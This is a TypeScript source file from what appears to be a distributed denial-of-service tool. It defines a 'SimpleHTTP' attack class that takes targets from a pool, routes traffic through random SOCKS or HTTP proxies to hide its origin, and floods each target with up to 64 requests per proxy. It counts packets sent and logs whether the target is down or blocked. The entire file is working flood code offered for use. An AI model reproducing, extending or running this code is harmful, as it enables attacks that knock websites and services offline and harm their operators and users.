import axios, { AxiosRequestConfig, AxiosProxyConfig, Method } from 'axios'
import { SocksProxyAgent } from 'socks-proxy-agent'

import { GetTarget } from '../external/targetsPool'
import { ProxyPool, Proxy } from '../external/proxyPool'
import { Algorithm, Config, ExecutionResult } from './algorithm'

import { HttpHeadersUtils } from './utils/httpHeadersUtils'

export abstract class SimpleHTTP extends Algorithm {
  protected proxyPool: ProxyPool

  abstract get method(): Method

  constructor (config: Config, proxyPool: ProxyPool) {
    super(config)
    this.proxyPool = proxyPool
  }

  async execute (target: GetTarget): Promise<ExecutionResult> {
    // Setting up proxy config
    let packetsSend = 0, packetsSuccess = 0

    if (this.config.useRealIP) {
      const success = await this.makeRequest(target.page, {})
      packetsSend += 1
      packetsSuccess += (success) ? 1 : 0
    } else {
      const proxy = this.proxyPool.getRandomProxy()
      if (proxy === null) {
        console.warn('Proxy request failed, because proxy wasnt founded.')
        await new Promise(resolve => setTimeout(resolve, 100))
        return { packetsSend, packetsSuccess, target }
      }

      const proxyConfig = this.generateProxyAxiosConfig(proxy)
      let success = true
      let repeats = 64
      while (success) {
        success = await this.makeRequest(target.page, proxyConfig)
        packetsSend += 1
        packetsSuccess += (success) ? 1 : 0
        repeats = repeats - 1
        success = success && (repeats > 0)
      }
    }

    return { packetsSend, packetsSuccess, target }
  }

  protected async makeRequest (url: string, config: AxiosRequestConfig) {
    try {
      const response = await axios.request({
        ...config,
        method: this.method,
        url,
        timeout: this.config.timeout,
        headers: HttpHeadersUtils.generateRequestHeaders(),
        validateStatus: () => true
      })
      console.log(`${url} | ${response.status}`)
      return true
    } catch (e) {
      console.log(`${url} | DOWN OR BLOCKED`)
      return false
    }
  }

  protected generateProxyAxiosConfig (proxy: Proxy) {
    const axiosConfig = { } as AxiosRequestConfig
    if (proxy.scheme === 'socks4' || proxy.scheme === 'socks5') {
      const agent = new SocksProxyAgent({
        host: proxy.host,
        port: proxy.port,
        username: proxy.username,
        password: proxy.password
      }, {
        timeout: 10000
      })

      axiosConfig.httpAgent = agent
      axiosConfig.httpsAgent = agent
    } else {
      const proxyConfig = {
        host: proxy.host,
        port: proxy.port,
        protocol: proxy.scheme
      } as AxiosProxyConfig
      if (proxy.username !== undefined && proxy.password !== undefined) {
        proxyConfig.auth = {
          username: proxy.username,
          password: proxy.password
        }
      }
      axiosConfig.proxy = proxyConfig
    }

    return axiosConfig
  }
}
